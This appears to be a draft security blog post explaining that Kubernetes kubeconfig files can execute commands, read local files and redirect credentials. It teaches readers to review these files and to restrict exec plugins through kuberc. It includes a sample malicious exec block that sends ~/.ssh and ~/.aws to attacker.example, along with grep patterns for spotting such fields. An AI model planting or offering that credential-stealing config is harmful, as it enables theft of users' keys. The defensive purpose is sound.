---
title: "Kubeconfig: Treat It Like a Shell Script"
date: 2026-11-11
draft: true
tags: ["kubernetes", "kubectl", "security", "kubeconfig"]
summary: "A kubeconfig looks like harmless YAML, but it can run programs, read local files and send your credentials somewhere else. Here is why you should review one before using it, and how to lock kubectl down."
---

Someone drops a `kubeconfig` into Slack. "Here's access to the staging cluster." You save it to `~/Downloads`, run `export KUBECONFIG=~/Downloads/staging.yaml`, type `kubectl get pods`, and move on with your day.

If they had sent you `setup.sh` instead, you would probably have opened it first. You should give the kubeconfig the same treatment. The Kubernetes documentation says so plainly: "Only use kubeconfig files from trusted sources."[^1] This post explains why that warning exists.

## It's not just connection details

Most of us think of a kubeconfig as a small address book: a server URL, a CA certificate, a token or client certificate, and a context that ties them together. That is what it usually contains. But the format supports quite a bit more, and several of those features are exactly what an attacker wants.

### 1. `exec` runs a program, as you

Exec credential plugins let a kubeconfig name an external command that fetches credentials. That's how `aws eks get-token`, `gke-gcloud-auth-plugin`, `kubelogin` and friends work. client-go runs the command, reads an `ExecCredential` object from its stdout, and uses the token or certificate it returns.[^2]

Nothing restricts *what* that command is. The Kubernetes project's own blog post on the topic opens by pointing out that kubectl can run arbitrary executables, including shell scripts, with the full privileges of the person invoking it, and without them noticing.[^3] A malicious entry can be as blunt as this:

```yaml
users:
- name: staging-admin
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: sh
      args:
      - -c
      - |
        tar c ~/.ssh ~/.aws | base64 | curl -s -d @- https://attacker.example
        echo '{"apiVersion":"client.authentication.k8s.io/v1","kind":"ExecCredential","status":{"token":"x"}}'
      interactiveMode: Never
```

It exfiltrates your SSH and cloud credentials, then prints a valid-looking credential so the command fails in an ordinary way ("Unauthorized") rather than a suspicious one. Banzai Cloud demonstrated this class of attack back in 2019, including a variant that deletes its own `exec` block from the file after the first run so there is nothing left to find.[^4]

Two details make this worse:

- **Relative paths resolve against the kubeconfig's directory.** If the command is `./bin/helper`, client-go runs the `bin/helper` that sits next to the kubeconfig file.[^5] A zip with "the kubeconfig and the auth helper you need" is a dropper.
- **It fires on almost any command.** You don't need to do anything privileged. `kubectl get ns`, `kubectl version`, or an IDE extension refreshing its cluster view is enough to trigger authentication.

### 2. Older `auth-provider` blocks did the same thing

Before exec plugins became the standard, the in-tree `auth-provider` plugins (notably `gcp`) had `cmd-path` and `cmd-args` fields that ran a command to fetch a token. Banzai Cloud's proof of concept used `cmd-path: /bin/sh` to archive `~/.ssh` and post it to a remote host.[^4] The in-tree cloud auth providers have since been removed from client-go, but old tools built against old client-go versions are still around, and the lesson stays the same: any field that names a command is an execution vector.

### 3. File references can read your local files

A kubeconfig can point at files instead of embedding data: `tokenFile`, `client-certificate`, `client-key`, `certificate-authority`. Those exist for good reasons (in-cluster clients read their mounted service account token via `tokenFile`, for example). But a hostile config can aim them at files *you* care about. `tokenFile` reads a file and sends its contents as a bearer token in the `Authorization` header to whatever server the config names.[^4] Point the server at a fake API endpoint and the attacker receives that file in their request logs. No code execution needed.

### 4. The server, proxy and TLS settings decide where your credentials go

Even a kubeconfig with no exec block and no file references controls the destination of every request:

- `server:` can be anything. If you merge the file with your own config, the merging rules decide which user and cluster entries win when names collide,[^1] so a context in the new file can end up pairing *your* existing credentials with *their* server.
- `insecure-skip-tls-verify: true` or an attacker-supplied `certificate-authority-data` means you're no longer verifying who you're talking to.
- `proxy-url` routes all your API traffic through a host of their choosing.

None of this is exotic. It's just the file doing exactly what it's designed to do, for someone other than you.

### 5. It's not only kubectl

kubectl is one consumer. Helm, k9s, Lens/Headlamp-style desktop apps, Terraform providers, IDE extensions, and in-house Go tools all load kubeconfigs through client-go. Banzai Cloud ran into this while building a "bring your own cluster" import feature, because services that accept a kubeconfig from users and then build a client from it inherit the same risks, server-side.[^4] Some tools now say so explicitly: Microsoft's DocumentDB extension for VS Code tells users to treat a pasted or dropped kubeconfig with the caution they'd give any script run locally,[^6] and the fnox secrets tool warns that kubeconfigs can reference credential plugins and other executable material.[^7]

## So, treat it like a shell script

The comparison holds up well. A kubeconfig from someone else is:

- **Executable**, through `exec` (and legacy `auth-provider` commands).
- **Able to read your files**, through path fields.
- **Able to send things over the network**, through `server` and `proxy-url`.
- **Run implicitly**, by tools you don't think of as "running" anything.

You wouldn't `curl | bash` from a stranger. Don't `export KUBECONFIG=` from one either.

## What to do about it

### Read it before you use it

Viewing the file doesn't execute anything. Look specifically for the dangerous fields:

```bash
grep -nE 'exec:|command:|args:|auth-provider|cmd-path|tokenFile|client-key:|client-certificate:|certificate-authority:|proxy-url|insecure-skip-tls-verify|server:' staging.yaml
```

Or with `yq`, to see every user's auth method and every cluster's endpoint at a glance:

```bash
yq '.users[] | {"name": .name, "exec": .user.exec, "auth-provider": .user."auth-provider", "tokenFile": .user.tokenFile}' staging.yaml
yq '.clusters[] | {"name": .name, "server": .cluster.server, "proxy": .cluster."proxy-url", "insecure": .cluster."insecure-skip-tls-verify"}' staging.yaml
```

Things that should make you stop and ask:

- an `exec.command` that isn't a well-known credential helper you already have installed (and especially `sh`, `bash`, `python`, `curl`, or a relative path)
- any `cmd-path`
- file paths outside the obvious (anything under `~/.ssh`, `~/.aws`, `~/.config`, `../`)
- `insecure-skip-tls-verify: true`, a `proxy-url`, or a server you don't recognise

### Prefer embedded data over paths

A config you accept should ideally use `certificate-authority-data`, `client-certificate-data`/`client-key-data` or a `token`, with no path-based fields. If it needs an exec helper, it should be one you installed yourself from a source you trust.

### Don't merge blindly

Keep third-party configs in their own files and select them per command with `--kubeconfig`, rather than adding them to a colon-separated `KUBECONFIG` list or merging them into `~/.kube/config`. The `--kubeconfig` flag uses only that file, with no merging.[^1]

### Turn on the kuberc credential plugin policy

This is the real fix, and it's newer than most people realise. kubectl's user-preferences file, `kuberc`, gained a credential plugin policy in Kubernetes v1.35 (beta).[^3] It sits *outside* the kubeconfig, so a malicious kubeconfig can't change it.

The policy has three modes. `AllowAll` is the default, for backwards compatibility. `DenyAll` blocks every exec plugin, and `Allowlist` lets only the plugins you list run.[^8] A good first step is `DenyAll`, to find out what your existing configs actually execute. Any blocked plugin shows up as a clear "not allowed" error.[^3]

```yaml
# ~/.kube/kuberc
apiVersion: kubectl.config.k8s.io/v1beta1
kind: Preference
credentialPluginPolicy: DenyAll
```

Then switch to an allowlist of the helpers you really use:

```yaml
# ~/.kube/kuberc
apiVersion: kubectl.config.k8s.io/v1beta1
kind: Preference
credentialPluginPolicy: Allowlist
credentialPluginAllowlist:
  - command: /usr/local/bin/aws
  - command: kubelogin
```

A few things to know:

- Entries are matched by resolving full paths; neither symlinks nor shell globs are resolved.[^9] An absolute path is stricter than a bare name, since a bare name is looked up on your `PATH`.
- In v1.35 the field was called `name`; from v1.36 it is `command`, with `name` kept as a deprecated alias while kuberc is in beta.[^9] Use `command` on current versions.
- This is a **kubectl** setting. As far as I can tell from the docs, it doesn't automatically protect other client-go tools (Helm, k9s, IDE plugins, your own Go code), so the review step above still matters.
- It covers exec plugins only. It doesn't stop a hostile config from using `tokenFile`, pointing at a malicious server, or disabling TLS verification.

### If you write tools that accept kubeconfigs

If your service lets users upload a kubeconfig, don't pass it straight to `clientcmd`. Parse it, reject or strip `exec`, `auth-provider` and every path-based field, validate the server URL against what you expect, and only then build a client. Banzai Cloud published a proof of concept, `kubeconfiger`, along these lines.[^4]

## Summary

A kubeconfig is configuration that can execute commands, read files and redirect traffic. The format is doing what it was designed to do. The problem is that we habitually treat these files as inert data. Read them before you use them, keep foreign ones isolated, and set a `credentialPluginPolicy` in your `kuberc` so kubectl only runs the helpers you've chosen.

[^1]: [Organizing Cluster Access Using kubeconfig Files — Kubernetes Documentation](https://raw.githubusercontent.com/kubernetes/website/6f1e5a9b1e7dce93a8afc425b41d8653e71e7f1e/content/en/docs/concepts/configuration/organize-cluster-access-kubeconfig.md)
[^2]: [Client Authentication (v1) — Kubernetes API reference](https://v1-36.docs.kubernetes.io/docs/reference/config-api/client-authentication.v1/)
[^3]: [Kubernetes v1.35: Restricting executables invoked by kubeconfigs via exec plugin allowList added to kuberc — Kubernetes Blog](https://kubernetes.io/blog/2026/01/09/kubernetes-v1-35-kuberc-credential-plugin-allowlist/)
[^4]: [The dark side of kubeconfig — Banzai Cloud (2019)](https://banzaicloud.github.io/blog/kubeconfig-security/)
[^5]: [Using client-keystone-auth — cloud-provider-openstack docs](https://github-redirect.dependabot.com/kubernetes/cloud-provider-openstack/blob/master/docs/keystone-auth/using-client-keystone-auth.md)
[^6]: [Kubernetes service discovery — DocumentDB for VS Code](https://microsoft.github.io/vscode-documentdb/user-manual/service-discovery-kubernetes)
[^7]: [Kubernetes Secrets provider — fnox](https://fnox.jdx.dev/providers/kubernetes.html)
[^8]: [kuberc (v1beta1) — Kubernetes API reference](https://kubernetes.io/docs/reference/config-api/kuberc.v1beta1)
[^9]: [Kubectl user preferences (kuberc) — Kubernetes Documentation](https://v1-36.docs.kubernetes.io/docs/reference/kubectl/kuberc/)
